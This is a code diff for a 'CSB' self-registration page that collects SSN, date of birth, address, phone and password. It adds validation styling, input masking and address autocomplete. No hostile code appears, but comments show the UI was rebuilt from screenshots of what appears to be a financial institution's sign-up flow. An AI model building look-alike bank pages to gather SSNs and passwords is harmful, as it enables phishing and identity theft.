@@ -60,6 +60,7 @@ body {
     border: none;
     line-height: 1;
     padding: 4px;
+    text-decoration: none;
 }
 
 .modal-header-title {
@@ -193,11 +194,32 @@ body {
     margin-bottom: 12px;
 }
 
+.field-wrapper {
+    display: flex;
+    flex-direction: column;
+}
+
 .csb-field-box {
     position: relative;
     border: 1px solid #b0bec5;
     background: #ffffff;
     border-radius: 2px;
+    transition: border-color 0.15s, background-color 0.15s;
+}
+
+.csb-field-box.has-error {
+    border: 1.5px solid #c8232c !important;
+    background-color: #fff9f9;
+}
+
+.csb-field-error-msg {
+    color: #c8232c;
+    font-size: 11px;
+    font-weight: bold;
+    margin-top: 3px;
+    padding-left: 2px;
+    text-align: left;
+    display: block;
 }
 
 .required-tag {
@@ -208,6 +230,7 @@ body {
     color: #78909c;
     pointer-events: none;
     font-style: italic;
+    z-index: 2;
 }
 
 .csb-field-box input {
@@ -220,12 +243,84 @@ body {
     font-weight: bold;
     color: #333333;
     letter-spacing: 0.5px;
+    background: transparent;
 }
 
 .csb-field-box input::placeholder {
     color: #78909c;
     font-weight: bold;
     letter-spacing: 0.6px;
+}
+
+.csb-toggle-pw {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    font-size: 11.5px;
+    font-weight: bold;
+    color: #1b325f;
+    cursor: pointer;
+    padding: 4px;
+    letter-spacing: 0.5px;
+}
+
+.csb-toggle-pw:hover {
+    color: #c8232c;
+}
+
+/* Address Autocomplete Suggestions */
+.csb-address-suggestions {
+    position: absolute;
+    top: 100%;
+    left: 0;
+    right: 0;
+    z-index: 9999;
+    background: #ffffff;
+    border: 1px solid #b0bec5;
+    border-top: none;
+    box-shadow: 0 6px 18px rgba(0, 0, 0, 0.15);
+    max-height: 220px;
+    overflow-y: auto;
+    display: none;
+}
+
+.csb-address-item {
+    padding: 9px 12px;
+    font-size: 12px;
+    color: #333333;
+    border-bottom: 1px solid #edf0f4;
+    cursor: pointer;
+    text-align: left;
+    line-height: 1.35;
+}
+
+.csb-address-item:last-child {
+    border-bottom: none;
+}
+
+.csb-address-item:hover {
+    background-color: #f1f5f9;
+    color: #1b325f;
+    font-weight: 600;
+}
+
+.manual-address-link {
+    display: inline-block;
+    font-size: 11px;
+    color: #1b325f;
+    text-align: right;
+    margin-top: 4px;
+    text-decoration: none;
+    cursor: pointer;
+    font-weight: 500;
+    align-self: flex-end;
+}
+
+.manual-address-link:hover {
+    text-decoration: underline;
 }
 
 /* Bottom Actions Bar */
@@ -307,7 +402,25 @@ body {
     line-height: 1.5;
     color: #ffffff;
     max-width: 600px;
+    margin: 0 auto 16px;
+}
+
+.csb-error-list-box {
+    max-width: 480px;
     margin: 0 auto 20px;
+    background: rgba(255, 255, 255, 0.08);
+    border-left: 3px solid #d9534f;
+    padding: 10px 16px;
+    text-align: left;
+    font-size: 12px;
+    color: #ffcdd2;
+    border-radius: 2px;
+}
+
+.csb-error-list-box ul {
+    list-style: disc;
+    padding-left: 18px;
+    line-height: 1.6;
 }
 
 .csb-error-btn {
@@ -321,6 +434,7 @@ body {
     cursor: pointer;
     text-transform: uppercase;
     letter-spacing: 0.5px;
+    transition: background-color 0.15s;
 }
 
 .csb-error-btn:hover {
@@ -340,7 +454,7 @@ body {
     <div class="csb-modal-card">
 
         {{-- Step 0: Welcome Screen (Screenshot 3) --}}
-        <div id="stepWelcome" @if($errors->any()) style="display:none;" @endif>
+        <div id="stepWelcome" @if($errors->any() || old('email') || old('first_name')) style="display:none;" @endif>
             <div class="modal-header-red">
                 <span></span>
                 <span class="modal-header-title">REGISTRATION</span>
@@ -366,7 +480,7 @@ body {
         </div>
 
         {{-- Step 1: General Form (Screenshot 4) --}}
-        <div id="stepForm" @if(!$errors->any()) style="display:none;" @endif>
+        <div id="stepForm" @if(!$errors->any() && !old('email') && !old('first_name')) style="display:none;" @endif>
             <div class="modal-header-red">
                 <button type="button" class="header-back-btn" id="btnBackToWelcome" title="Back">&lsaquo;</button>
                 <span class="modal-header-title">GENERAL</span>
@@ -377,31 +491,63 @@ body {
                 <form method="POST" action="{{ route('register') }}" id="csbSelfRegForm">
                     @csrf
 
+                    {{-- Hidden defaults to pass validation requirements --}}
+                    <input type="hidden" name="country" value="{{ ($location->name ?? 'United States') . ':' . ($location->dial_code ?? '1') }}">
+                    <input type="hidden" name="invite" value="{{ $referralCode ?? '' }}">
+
                     <!-- Personal Information -->
                     <div class="section-heading">PERSONAL INFORMATION</div>
 
                     <div class="form-grid-3">
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="text" name="first_name" value="{{ old('first_name') }}" placeholder="FIRST NAME" required>
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('first_name') has-error @enderror">
+                                <span class="required-tag">required</span>
+                                <input type="text" name="first_name" id="first_name_field" value="{{ old('first_name') }}" placeholder="FIRST NAME" required>
+                            </div>
+                            @error('first_name')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
-                        <div class="csb-field-box">
-                            <input type="text" name="middle_name" value="{{ old('middle_name') }}" placeholder="MIDDLE NAME">
+
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('middle_name') has-error @enderror">
+                                <input type="text" name="middle_name" value="{{ old('middle_name') }}" placeholder="MIDDLE NAME">
+                            </div>
+                            @error('middle_name')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="text" name="last_name" value="{{ old('last_name') }}" placeholder="LAST NAME" required>
+
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('last_name') has-error @enderror">
+                                <span class="required-tag">required</span>
+                                <input type="text" name="last_name" id="last_name_field" value="{{ old('last_name') }}" placeholder="LAST NAME" required>
+                            </div>
+                            @error('last_name')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
                     </div>
 
                     <div class="form-grid-2">
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="text" name="date_of_birth" id="dob_field" value="{{ old('date_of_birth') }}" placeholder="DATE OF BIRTH" required>
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('date_of_birth') has-error @enderror">
+                                <span class="required-tag">required</span>
+                                <input type="text" name="date_of_birth" id="dob_field" value="{{ old('date_of_birth') }}" placeholder="DATE OF BIRTH" required>
+                            </div>
+                            @error('date_of_birth')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="text" name="ssn" id="ssn_field" value="{{ old('ssn') }}" placeholder="SSN / TAX ID" maxlength="11" required>
+
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('ssn') has-error @enderror">
+                                <span class="required-tag">required</span>
+                                <input type="text" name="ssn" id="ssn_field" value="{{ old('ssn') }}" placeholder="SSN / TAX ID" maxlength="11" required>
+                            </div>
+                            @error('ssn')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
                     </div>
 
@@ -409,42 +555,90 @@ body {
                     <div class="section-heading">CONTACT INFORMATION</div>
 
                     <div class="form-grid-2">
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="text" name="address" value="{{ old('address') }}" placeholder="ADDRESS" required>
+                        <div class="field-wrapper" style="position: relative;">
+                            <div class="csb-field-box @error('address') has-error @enderror" style="position: relative;">
+                                <span class="required-tag">required</span>
+                                <input type="text" name="address" id="address_field" value="{{ old('address') }}" placeholder="ADDRESS" required autocomplete="off">
+                                <div id="address-results" class="csb-address-suggestions"></div>
+                            </div>
+                            <a href="javascript:void(0)" id="btn-manual-address" class="manual-address-link">Or enter address manually</a>
+                            @error('address')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
-                        <div class="csb-field-box">
-                            <input type="text" name="address_line_2" value="{{ old('address_line_2') }}" placeholder="ADDRESS LINE 2">
+
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('address_line_2') has-error @enderror">
+                                <input type="text" name="address_line_2" value="{{ old('address_line_2') }}" placeholder="ADDRESS LINE 2">
+                            </div>
+                            @error('address_line_2')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
                     </div>
 
                     <div class="form-grid-3">
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="text" name="city" value="{{ old('city') }}" placeholder="CITY" required>
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('city') has-error @enderror">
+                                <span class="required-tag">required</span>
+                                <input type="text" name="city" id="city_field" value="{{ old('city') }}" placeholder="CITY" required>
+                            </div>
+                            @error('city')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="text" name="state" value="{{ old('state') }}" placeholder="STATE" required>
+
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('state') has-error @enderror">
+                                <span class="required-tag">required</span>
+                                <input type="text" name="state" id="state_field" value="{{ old('state') }}" placeholder="STATE" required>
+                            </div>
+                            @error('state')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="text" name="zip_code" value="{{ old('zip_code') }}" placeholder="ZIP" required>
+
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('zip_code') has-error @enderror">
+                                <span class="required-tag">required</span>
+                                <input type="text" name="zip_code" id="zip_code_field" value="{{ old('zip_code') }}" placeholder="ZIP" required>
+                            </div>
+                            @error('zip_code')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
                     </div>
 
                     <div class="form-grid-3">
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="email" name="email" value="{{ old('email') }}" placeholder="EMAIL" required>
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('email') has-error @enderror">
+                                <span class="required-tag">required</span>
+                                <input type="email" name="email" id="email_field" value="{{ old('email') }}" placeholder="EMAIL" required>
+                            </div>
+                            @error('email')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="tel" name="phone" value="{{ old('phone') }}" placeholder="PHONE" required>
+
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('phone') has-error @enderror">
+                                <span class="required-tag">required</span>
+                                <input type="tel" name="phone" id="phone_field" value="{{ old('phone') }}" placeholder="PHONE" required>
+                            </div>
+                            @error('phone')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
-                        <div class="csb-field-box">
-                            <span class="required-tag">required</span>
-                            <input type="password" name="password" placeholder="PASSWORD" required>
+
+                        <div class="field-wrapper">
+                            <div class="csb-field-box @error('password') has-error @enderror" style="position: relative;">
+                                <span class="required-tag">required</span>
+                                <input type="password" name="password" id="password_field" placeholder="PASSWORD" required>
+                                <button type="button" class="csb-toggle-pw" id="btnTogglePw">SHOW</button>
+                            </div>
+                            @error('password')
+                                <span class="csb-field-error-msg">{{ $message }}</span>
+                            @enderror
                         </div>
                     </div>
 
@@ -468,7 +662,18 @@ body {
                 Please double check your information and if you feel it is<br>
                 correct please contact your financial institution for further help.
             </div>
-            <button type="button" class="csb-error-btn" onclick="document.getElementById('errorOverlay').style.display='none'">OK</button>
+
+            @if ($errors->any())
+            <div class="csb-error-list-box">
+                <ul>
+                    @foreach ($errors->all() as $err)
+                        <li>{{ $err }}</li>
+                    @endforeach
+                </ul>
+            </div>
+            @endif
+
+            <button type="button" class="csb-error-btn" onclick="dismissErrorOverlay()">OK</button>
         </div>
     </div>
     @endif
@@ -476,6 +681,26 @@ body {
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
     <script>
+    function dismissErrorOverlay() {
+        var overlay = document.getElementById('errorOverlay');
+        if (overlay) overlay.style.display = 'none';
+
+        // Focus first erroneous field if one exists
+        var firstErr = document.querySelector('.csb-field-box.has-error input');
+        if (firstErr) firstErr.focus();
+    }
+
+    // Phone Auto-Arrangement: (123) 456-7890
+    function formatUSPhone(value) {
+        if (!value) return '';
+        var digits = value.replace(/\D/g, '').substring(0, 10);
+        var len = digits.length;
+        if (len === 0) return '';
+        if (len < 4) return '(' + digits;
+        if (len < 7) return '(' + digits.substring(0, 3) + ') ' + digits.substring(3);
+        return '(' + digits.substring(0, 3) + ') ' + digits.substring(3, 6) + '-' + digits.substring(6, 10);
+    }
+
     document.addEventListener('DOMContentLoaded', function () {
         var btnGetStarted = document.getElementById('btnGetStarted');
         var btnBack = document.getElementById('btnBackToWelcome');
@@ -486,6 +711,8 @@ body {
             btnGetStarted.addEventListener('click', function () {
                 stepWelcome.style.display = 'none';
                 stepForm.style.display = 'block';
+                var firstInput = document.getElementById('first_name_field');
+                if (firstInput) firstInput.focus();
             });
         }
 
@@ -496,12 +723,105 @@ body {
             });
         }
 
+        // Phone Masking
+        var phoneField = document.getElementById('phone_field');
+        if (phoneField) {
+            if (phoneField.value) {
+                phoneField.value = formatUSPhone(phoneField.value);
+            }
+            phoneField.addEventListener('input', function (e) {
+                this.value = formatUSPhone(this.value);
+            });
+        }
+
+        // Password Show/Hide Toggle
+        var btnTogglePw = document.getElementById('btnTogglePw');
+        var pwField = document.getElementById('password_field');
+        if (btnTogglePw && pwField) {
+            btnTogglePw.addEventListener('click', function () {
+                if (pwField.type === 'password') {
+                    pwField.type = 'text';
+                    btnTogglePw.textContent = 'HIDE';
+                } else {
+                    pwField.type = 'password';
+                    btnTogglePw.textContent = 'SHOW';
+                }
+            });
+        }
+
+        // SSN Cleave Formatting
         if ($('#ssn_field').length) {
             new Cleave('#ssn_field', { delimiters: ['-', '-'], blocks: [3, 2, 4], numericOnly: true });
         }
+
+        // Date of Birth Cleave Formatting (MM/DD/YYYY)
         if ($('#dob_field').length) {
             new Cleave('#dob_field', { date: true, datePattern: ['m', 'd', 'Y'] });
         }
+
+        // Address Autocomplete with Manual Fallback (Nominatim US API)
+        var addrTimeout = null;
+        var manualAddressMode = false;
+        var $addrField = $('#address_field');
+        var $addrResults = $('#address-results');
+        var $btnManualAddr = $('#btn-manual-address');
+
+        $btnManualAddr.on('click', function() {
+            manualAddressMode = true;
+            $addrResults.hide().empty();
+            $(this).hide();
+            $addrField.focus();
+        });
+
+        $addrField.on('input', function() {
+            if (manualAddressMode) return;
+
+            var query = $(this).val();
+            clearTimeout(addrTimeout);
+
+            if (query.length < 3) {
+                $addrResults.hide().empty();
+                return;
+            }
+
+            addrTimeout = setTimeout(function() {
+                $.get('https://nominatim.openstreetmap.org/search?format=json&q=' + encodeURIComponent(query) + '&addressdetails=1&limit=5&countrycodes=us', function(data) {
+                    $addrResults.empty().show();
+                    if (!data || data.length === 0) {
+                        $addrResults.append('<div class="csb-address-item" style="color:#78909c;">No matching USA addresses found</div>');
+                    } else {
+                        data.forEach(function(item) {
+                            var addr = item.address || {};
+                            var city = addr.city || addr.town || addr.village || addr.suburb || addr.hamlet || addr.county || '';
+                            var postcode = addr.postcode || '';
+                            var houseNumber = addr.house_number || '';
+                            var road = addr.road || '';
+                            var state = addr.state || '';
+
+                            var cleanStreet = road;
+                            if (houseNumber) cleanStreet = houseNumber + ' ' + road;
+                            if (!cleanStreet) cleanStreet = item.display_name.split(',')[0];
+
+                            var div = $('<div class="csb-address-item"></div>').text(item.display_name);
+                            div.on('click', function() {
+                                $addrField.val(cleanStreet);
+                                if (city) $('#city_field').val(city);
+                                if (state) $('#state_field').val(state);
+                                if (postcode) $('#zip_code_field').val(postcode);
+                                $addrResults.hide().empty();
+                            });
+                            $addrResults.append(div);
+                        });
+                    }
+                });
+            }, 350);
+        });
+
+        $(document).on('click', function(e) {
+            if (!$(e.target).closest('#address_field, #address-results').length) {
+                $addrResults.hide().empty();
+            }
+        });
     });
     </script>
 </body>
